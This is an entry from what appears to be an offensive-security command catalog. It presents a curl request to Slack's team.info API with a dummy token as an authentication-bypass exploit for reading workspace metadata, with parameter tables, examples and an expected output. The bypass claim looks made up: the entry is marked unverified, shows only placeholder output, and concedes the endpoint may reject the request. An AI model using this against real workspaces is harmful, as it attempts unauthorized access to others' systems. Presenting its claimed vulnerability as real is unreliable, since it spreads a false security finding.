---
id: cmd-curl-slack-metadata
data: >-
  curl -X GET "https://slack.com/api/team.info?token=invalid_or_missing" -H
  "Accept: application/json" -s
tags:
  - recon
  - auth-bypass
  - http
type: command
output: >-
  {"ok":true,"team":{"id":"TXXXXX","name":"Example
  Workspace","domain":"example.slack.com"}}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.075Z'
verified: false
validated: true
submitted: true
---
# curl-slack-metadata-access

## Command

```bash
curl -X GET "https://slack.com/api/team.info?token=invalid_or_missing" -H "Accept: application/json" -s
```

## Description

This command uses curl to perform an unauthorized GET request to Slack's team.info API endpoint, exploiting improper authentication to retrieve workspace metadata. It is useful for testing auth bypass vulnerabilities in cloud collaboration tools like Slack.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://slack.com/api/team.info?token=invalid_or_missing"` | The target URL with a dummy token to simulate missing auth | Yes |
| `-H "Accept: application/json"` | Sets the Accept header to request JSON response | Yes |
| `-s` | Silent mode to suppress progress meter | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://slack.com/api/team.info?token=invalid_or_missing" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://slack.com/api/team.info?token=invalid_or_missing" -H "Accept: application/json" -s | jq '.team.name'
```

This pipes the output to jq to extract just the team name.

## Expected Output

Successful execution returns a JSON object like: {"ok":true,"team":{"id":"TXXXXX","name":"Example Workspace","domain":"example.slack.com","...":{...}}}. If auth is enforced, expect {"ok":false,"error":"invalid_auth"}.

## Related

- [[Related Procedure|procedures/Exploit-Slack-Improper-Authentication-for-Metadata-Access]]
